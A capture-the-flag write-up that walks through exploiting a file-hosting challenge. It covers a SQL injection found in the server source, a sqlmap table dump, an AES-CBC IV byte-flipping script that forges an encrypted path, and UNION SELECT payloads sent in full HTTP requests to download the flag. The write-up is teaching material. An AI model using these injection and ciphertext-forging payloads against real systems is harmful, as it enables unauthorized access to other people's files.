## Author
Arjun Lalith
## Approach

### Finding the attack path 

Browsing the website, we find that it is a website that allows you to create an account and host text files.

Next we look at the source code for the web server, and in `database.py` we find see the following function:
```python
def fetch_file_db(user_id,file_id):
    try:
        file = db.session.execute(text(f"SELECT * FROM File WHERE id = {file_id}")).first() #SQL Injection
        if file:
            filepath = decrypt(file.filepath)
            filename = decrypt(file.filename)
            if file.user_id == user_id and filepath is not None and filename is not None:
                return {"id":file.id,"filepath":filepath.decode(),"filename":filename.decode(),"title":file.title}
        return False
    except Exception as e:
        logging.error(e)
        return False
```

We see that this function has an obvious SQL injection, and it is the only database function that queries the database in this manner. This is probably a vector for attack, so let's analyze where this function is being used. 

This function is being in the routes to `/files/download` and `/files/info`.  Let's mess with `/files/info`. First let's upload a file called `flag.txt` to the server and get it's `file_id`. In this case I ended up with a `file_id` of 402. Let's go ahead and send out a request to `/files/info` with an `AND 1=1` payload and see what we get back:
#### Request:
```
POST /api/files/info HTTP/1.1
Host: uscybercombine-s4-web-secure-file-storage.chals.io
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFyanVuIiwiaWQiOjE0OX0.bow8Xe0vVpNhybZknSuCSw9OxDDJfXY3cuXFhcVZ-AE; session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIkZpbGUgdXBsb2FkZWQgc3VjY2Vzc2Z1bGx5ISJdfV19.ZoqtyA.0TGe1yoGWseolU539r99gWteGQo
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://uscybercombine-s4-web-secure-file-storage.chals.io/files
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 25
Content-Type: application/x-www-form-urlencoded

file_id=402+AND+1%3d1
```

#### Response:
```
HTTP/1.1 200 OK
Server: gunicorn
Date: Sun, 07 Jul 2024 15:11:54 GMT
Connection: close
Content-Type: application/json
Content-Length: 110

{"message":{"file":{"filename":"flag.txt","filepath":"/app/uploads/arjun","id":402,"title":"OMG"},"size":18}}
```

The web server successfully returns the correct file, so we are able to confirm that the API route is in fact vulnerable to SQL injection. 

Now that we've messed with `/files/info`, let's take a look at the code for the `/files/download` route:
```python
@api.route('/files/download/<file_id>', methods=['GET'])
@api.route('/files/download', methods=["POST"], defaults={"file_id":None})
@isAuthenticated
def download_file(file_id,user):

    if not file_id:
        file_id = request.form.get("file_id")

    if not file_id:
        flash('No file ID provided.',"danger")
        return redirect("/files")
    
    file = fetch_file_db(user["id"],file_id)

    if not file:
        flash('Invalid file provided, or you may not have permission to view this file.',"danger")
        return redirect("/files")
    
    return send_file(os.path.join(file["filepath"],file["filename"]), as_attachment=True, download_name=file["filename"])
```

This is a pretty straightforward function, it will give you the file contents of the file requested but only if the function `fetch_file_db` returns a valid file. This is the function we looked at earlier, which only returns a valid file if it is able to successfully able to decrypt the `filepath` and `filename` as well as if the `user_id` associated with the file matches the `user_id` of the user making the request. 

Luckily, since the `fetch_file_db` is vulnerable to SQL injection, we can use a `UNION SELECT` query to create our own rows of data as if it existed in the database. In order for `/files/download` to successfully return us the contents of `/flag.txt` we will need make a `UNION SELECT` payload that has the following:
 - An encrypted `filename` that successfully decrypts to `flag.txt`
 - An encrypted `filepath` that successfully decrypts to `/`
 - And the `user_id` matching our own `user_id` (this part is trivial, we just include our `user_id` in the `UNION SELECT` statement).


### Getting the encrypted value of flag.txt
Let's start dumping the database. First we need our `user_id` since we don't want to dump the entire database, only the data relevant to our user. This can be found in the payload section of our JWT cookie, which is `149` for us. Next let's set up our sqlmap command:
```
sqlmap -T file --dump --cookie 'auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFyanVuIiwiaWQiOjE0OX0.bow8Xe0vVpNhybZknSuCSw9OxDDJfXY3cuXFhcVZ-AE' --data file_id=402 -u https://uscybercombine-s4-web-secure-file-storage.chals.io/api/files/info --threads 10 --where 'user_id=149' --fresh-queries
``` 

This provides us with a table that contains only the file that we uploaded:
```
Database: <current>
Table: file
[1 entry]
+-----+---------+-------+----------------------------------------------+------------------------------------------------------------------+
| id  | user_id | title | filename                                     | filepath                                                         |
+-----+---------+-------+----------------------------------------------+------------------------------------------------------------------+
| 402 | 149     | OMG   | eOhsQAzpxg45OKrxM0HlOzDiJBIX6SZk/REqb10DF2Q= | NKaHIFVoihif5mxC3sG15ketlbCDTlciKQq0wnYu5AEwg41gmVmf2nLPa6Lb5Tgu |
+-----+---------+-------+----------------------------------------------+------------------------------------------------------------------+
```

Now we see that the filename `flag.txt` is encrypted and base64-encoded to the value `eOhsQAzpxg45OKrxM0HlOzDiJBIX6SZk/REqb10DF2Q=`. We are currently halfway there, as we still need to find a value that will successfully decrypt to `/`.

### Getting the encrypted value of /
Let's look at the `decrypt` function that the database uses:
```python
def decrypt(ciphertext):
    try:
        ciphertext = base64.b64decode(ciphertext)
        iv,ciphertext = ciphertext[:16],ciphertext[16:]
        cipher = AES.new(app.config["AES_KEY"], AES.MODE_CBC,iv=iv)
        return unpad(cipher.decrypt(ciphertext), AES.block_size)
    except Exception as e:
        logging.error(e)
        return None
```

There are two things of note: the web server uses AES CBC, and the IV is included in the encrypted value. Let's say we encrypt the filename `123456789ABCD.txt`, which is a 17-byte long filename. The encrypted value returned will be 48 bytes after it is base64 decoded. We can verify this by dumping the database again:
```
Database: <current>
Table: file
[2 entries]
+-----+---------+-------+------------------------------------------------------------------+------------------------------------------------------------------+
| id  | user_id | title | filename                                                         | filepath                                                         |
+-----+---------+-------+------------------------------------------------------------------+------------------------------------------------------------------+
| 402 | 149     | OMG   | eOhsQAzpxg45OKrxM0HlOzDiJBIX6SZk/REqb10DF2Q=                     | NKaHIFVoihif5mxC3sG15ketlbCDTlciKQq0wnYu5AEwg41gmVmf2nLPa6Lb5Tgu |
| 403 | 149     | pls   | eSCeM7m5WRIfpvsfqxPR6BfXMDlYZl4U3tICOxTO3FhN6MEyru+rdu/IhmCuUwYf | eIX4erdKJ7kDlD9N1CWE+BOhdqc2ptNfdLKx6F+kqrq1r6JCfa1Jk6+03gNmEjWd |
+-----+---------+-------+------------------------------------------------------------------+------------------------------------------------------------------+
```

The 48 byte value consists of three 16 byte blocks. The first block is the 16 byte IV. The second block is the first 16 bytes of our filename, which is `123456789ACD.tx`. The third block is the rest of the filename padded to 16 bytes using PKCS, which decrypts to `t\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e`. This results in our full plaintext actually being `123456789ACD.txt\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e` when it is decrypted. If we remove the first block and use the first 16 bytes of our encrypted filename as the IV, we will still be able to successfully decrypt, however now our filename will be just be the last block, `t\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e`. This is close to what we want for our `filepath`, however we want the first byte to be a "`/`" instead of a "`t`". In order to flip this byte correctly, we can modify the first byte of our new IV until we get an IV that decrypts the payload to a `/` with proper padding. 

The following script generates the value:
```python
import requests
import base64


payload = list(base64.b64decode("eSCeM7m5WRIfpvsfqxPR6BfXMDlYZl4U3tICOxTO3FhN6MEyru+rdu/IhmCuUwYf"))

flag_txt_enc = 'eOhsQAzpxg45OKrxM0HlOzDiJBIX6SZk/REqb10DF2Q='
user_id = 149
jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFyanVuIiwiaWQiOjE0OX0.bow8Xe0vVpNhybZknSuCSw9OxDDJfXY3cuXFhcVZ-AE"


#remove IV
payload = payload[16:]


cookie = {
        "auth": jwt_token
        }


for j in range(0,0x100):

    #change the first byte of IV to change the first byte of the encrypted block
    payload[0] = j
    new_payload = base64.b64encode(bytes(payload)).decode()
    data = {
            "file_id": f'999999 UNION SELECT 1,{user_id},"","{flag_txt_enc}","{new_payload}"'
            }

    resp = requests.post('https://uscybercombine-s4-web-secure-file-storage.chals.io/api/files/info', data=data, cookies=cookie)
    if b'flag.txt' in resp.content:
        print(j)
        print(resp.content)
        print(new_payload)
        print(data['file_id'])
        break
```

`payload` is the 48-byte base64 encrypted value that we dumped in the last step. `flag_txt_enc` is the encrypted value of `flag.txt` that we obtained during the SQL dump in the last section. `jwt_token` is the JWT token of our user and `user_id` is the user id of our user, which can be found in the data section of our JWT token.

First the script removes the first 16 byte block from the payload. Instead it will use the second block as the IV. Now our plaintext is a one 16 byte block that successfully decrypts to `t\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e` .  For each request we modify the first byte of our new payload, which when decrypted will modify the first byte of the plaintext. The only time we ever get a successful response back is when the server is able to successfully decrypt our payload to `/\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e`. 

We run our script and it outputs the following:
```
$ python3 solve.py
76
b'{"message":{"file":{"filename":"flag.txt","filepath":"/","id":1,"title":""},"size":26}}\n'
TNcwOVhmXhTe0gI7FM7cWE3owTKu76t278iGYK5TBh8=
999999 UNION SELECT 1,149,"","eOhsQAzpxg45OKrxM0HlOzDiJBIX6SZk/REqb10DF2Q=","TNcwOVhmXhTe0gI7FM7cWE3owTKu76t278iGYK5TBh8="
```

As you can see from the response, the file path was successfully decrypted as `/` and the file name was successfully decrypted as `flag.txt`. The size that is given in the response also tells us that the file actually exists on the server, so we know this is a successful payload. Now we can take the last line of output, url-encode it and send it to `/file/download` as the parameter `file_id`. 

#### Request:
```
POST /api/files/download HTTP/1.1
Host: uscybercombine-s4-web-secure-file-storage.chals.io
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFyanVuIiwiaWQiOjE0OX0.bow8Xe0vVpNhybZknSuCSw9OxDDJfXY3cuXFhcVZ-AE
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://uscybercombine-s4-web-secure-file-storage.chals.io/files
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 134
Content-Type: application/x-www-form-urlencoded

file_id=999999+UNION+SELECT+1,149,"","eOhsQAzpxg45OKrxM0HlOzDiJBIX6SZk/REqb10DF2Q%3d","TNcwOVhmXhTe0gI7FM7cWE3owTKu76t278iGYK5TBh8%3d"
```

#### Response:
```
HTTP/1.1 200 OK
Server: gunicorn
Date: Mon, 08 Jul 2024 01:06:24 GMT
Connection: close
Content-Disposition: attachment; filename=flag.txt
Content-Type: text/plain; charset=utf-8
Content-Length: 26
Last-Modified: Fri, 10 May 2024 12:30:21 GMT
Cache-Control: no-cache
ETag: "1715344221.0-26-261423960"

SIVUSCG{b1t_fl1pp3d_f1l3s}
```

## Bonus

While the `/file/download` endpoint supported `POST` requests this time around, only `GET` requests were supported during the actual CTF. Let's get the flag using a `GET` request, since it provides more nuance and was actually how to do it during the CTF.

If we simply try to base64 encode our payload and try to `/api/download/999999+UNION+SELECT+1,149,"","eOhsQAzpxg45OKrxM0HlOzDiJBIX6SZk/REqb10DF2Q%3d","TNcwOVhmXhTe0gI7FM7cWE3owTKu76t278iGYK5TBh8%3d"` you will notice that we will get an error

### Request
```
GET /api/files/download/999999+UNION+SELECT+1,149,"","eOhsQAzpxg45OKrxM0HlOzDiJBIX6SZk/REqb10DF2Q%3d","TNcwOVhmXhTe0gI7FM7cWE3owTKu76t278iGYK5TBh8%3d" HTTP/1.1
Host: uscybercombine-s4-web-secure-file-storage.chals.io
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFyanVuIiwiaWQiOjE0OX0.bow8Xe0vVpNhybZknSuCSw9OxDDJfXY3cuXFhcVZ-AE
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://uscybercombine-s4-web-secure-file-storage.chals.io/files
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


```

### Response
```
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Mon, 08 Jul 2024 01:22:07 GMT
Connection: close
Content-Type: application/json
Content-Length: 28

{"message":"404 Not Found"}
```

This is because the encrypted value for `flag.txt` contains a slash, which the web server interprets as part of the web path, and thus tries to serve a different route. We will need to modify our payload to remove all traces of slash characters. In this case, we need to have the encrypted value of `flag.txt` in our payload without directly referencing it. In order to do this, we can pull it directly from the database, filtering by a unique title. In our case the following payload will work:
```
999999 UNION SELECT 1,149,"",filename,"TNcwOVhmXhTe0gI7FM7cWE3owTKu76t278iGYK5TBh8=" FROM file WHERE title="OMG"
```

We URL encode the payload, and then send a `GET` request to  `/files/download/%39%39%39%39%39%39%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%31%34%39%2c%22%22%2c%66%69%6c%65%6e%61%6d%65%2c%22%54%4e%63%77%4f%56%68%6d%58%68%54%65%30%67%49%37%46%4d%37%63%57%45%33%6f%77%54%4b%75%37%36%74%32%37%38%69%47%59%4b%35%54%42%68%38%3d%22%20%46%52%4f%4d%20%66%69%6c%65%20%57%48%45%52%45%20%74%69%74%6c%65%3d%22%4f%4d%47%22` and we get flag

### Request
```
GET /api/files/download/%39%39%39%39%39%39%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%31%34%39%2c%22%22%2c%66%69%6c%65%6e%61%6d%65%2c%22%54%4e%63%77%4f%56%68%6d%58%68%54%65%30%67%49%37%46%4d%37%63%57%45%33%6f%77%54%4b%75%37%36%74%32%37%38%69%47%59%4b%35%54%42%68%38%3d%22%20%46%52%4f%4d%20%66%69%6c%65%20%57%48%45%52%45%20%74%69%74%6c%65%3d%22%4f%4d%47%22 HTTP/1.1
Host: uscybercombine-s4-web-secure-file-storage.chals.io
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFyanVuIiwiaWQiOjE0OX0.bow8Xe0vVpNhybZknSuCSw9OxDDJfXY3cuXFhcVZ-AE
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://uscybercombine-s4-web-secure-file-storage.chals.io/files
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


```

### Response
```
HTTP/1.1 200 OK
Server: gunicorn
Date: Mon, 08 Jul 2024 01:29:52 GMT
Connection: close
Content-Disposition: attachment; filename=flag.txt
Content-Type: text/plain; charset=utf-8
Content-Length: 26
Last-Modified: Fri, 10 May 2024 12:30:21 GMT
Cache-Control: no-cache
ETag: "1715344221.0-26-261423960"

SIVUSCG{b1t_fl1pp3d_f1l3s}
```
## Flag
```
SIVUSCG{b1t_fl1pp3d_f1l3s}
```